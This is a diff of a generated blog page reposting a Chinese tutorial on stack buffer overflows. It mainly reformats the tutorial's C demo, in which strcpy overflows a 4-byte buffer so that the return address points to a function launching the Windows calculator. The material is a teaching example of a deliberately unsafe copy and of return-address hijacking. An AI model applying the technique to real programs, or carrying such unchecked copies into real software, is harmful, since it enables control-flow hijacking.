@@ -88,7 +88,7 @@
 <meta property="og:site_name" content="南南瓜瓜瓜の博客">
 <meta property="og:description" content="本文链接：https://blog.csdn.net/qq_38919714/article/details/79249424环境：win10 工具：vc++6 原理介绍：  栈溢出，C语言中gets()、strcpy()等函数未进行数据长度的限定，在栈内写入超出长度限制的数据，从而破坏程序运行甚至获得系统控制权的攻击手段。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-15T15:39:26.922Z">
+<meta property="og:updated_time" content="2019-08-27T14:15:40.803Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用缓存区漏洞执行shellcode">
 <meta name="twitter:description" content="本文链接：https://blog.csdn.net/qq_38919714/article/details/79249424环境：win10 工具：vc++6 原理介绍：  栈溢出，C语言中gets()、strcpy()等函数未进行数据长度的限定，在栈内写入超出长度限制的数据，从而破坏程序运行甚至获得系统控制权的攻击手段。">
@@ -328,26 +328,8 @@
 <p>  一个函数调用结束时，也就是在退栈过程中，返回地址会被传给eip，这一点非常重要。当返回地址被我们溢出的数据覆盖的时候，就可以控制eip，从而获得计算机的控制权，所以我们只需要让覆盖返回地址的数据恰好为shellcode的地址，就可以执行自己的shellcode了。</p>
 <p> 我提前写好了代码，先看主函数，定义了一个字符串shellcode用来溢出，将它传入overflow（）函数，在overflow（）函数中</p>
 <p>利用strcpy（）函数进行溢出，对数据进行填充。还有一个从头到尾都没有调用的函数calc（）函数，它可以打开电脑的计算器</p>
-<p>#include&lt;stdio.h&gt;</p>
-<p>#include&lt;string.h&gt;</p>
-<p>#include&lt;windows.h&gt;</p>
-<p>void calc(){</p>
-<p>  system(“calc”);</p>
-<p>  exit(0);//防止程序崩溃</p>
-<p>}</p>
-<p>int overflow(char *shellcode) </p>
-<p>{ </p>
-<p>char str[4]=””;</p>
-<p>  strcpy(str,shellcode);</p>
-<p>  return 0;</p>
-<p>}  </p>
-<p>int main() </p>
-<p>{ </p>
-<p> char shellcode[]=”aaaaaaaa\x05\x10\x40\x00”;</p>
-<p> overflow(shellcode);</p>
-<p> //calc();</p>
-<p> return 0; </p>
-<p>}</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  system(<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">//防止程序崩溃</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">(<span class="keyword">char</span> *shellcode)</span> </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">4</span>]=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(str,shellcode);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"></span><br><span class="line"> <span class="keyword">char</span> shellcode[]=<span class="string">"aaaaaaaa\x05\x10\x40\x00"</span>;</span><br><span class="line"></span><br><span class="line"> overflow(shellcode);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//calc();</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>以前的文章搬过来，继续水…</p>
 
       
@@ -475,7 +457,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
